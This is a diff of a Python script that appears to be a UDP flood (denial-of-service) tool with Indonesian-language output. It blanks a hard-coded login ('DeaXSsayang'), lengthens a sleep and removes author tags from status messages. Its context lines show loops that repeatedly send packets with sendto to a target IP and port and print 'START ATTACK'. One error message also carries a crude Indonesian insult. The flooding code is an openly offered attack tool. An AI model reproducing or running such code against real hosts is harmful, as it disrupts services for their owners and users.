@@ -21,14 +21,14 @@ print("""\033[91m
 
 username = str(input("\033[94m[DeaXs] \033[93mUsername:"))
 password = str(input("\033[94m[DeaXs] \033[93mPassword:"))
-if password == "DeaXSsayang" and username == "DeaXSsayang":
+if password == "" and username == "":
     print ("Telah Masuk Sebagai DeaXs")
-    time.sleep(2)
+    time.sleep(100)
 
 else:
     print ("Passwordnya Salah Bruh.")
     time.sleep(999)
-
+    
 os.system("clear")
 print("\033[92mConnecting To Server [\033[97m•\033[92m]")
 time.sleep(0.5)
@@ -84,7 +84,7 @@ def dz():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[91mSTART \033[94mBY ATTACK")
+			print(i +" \033[91mSTART \033[94mATTACK")
 		except:
 			s.close()
 			print("\033[92m EROR \033[93m KONTOL")
@@ -98,7 +98,7 @@ def dz2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[91mSTART \033[94mBY DEAXS")
+			print(i +" \033[91mSTART \033[94mATTACK")
 		except:
 			s.close()
 			print("\033[92m EROR \033[93m KONTOL")
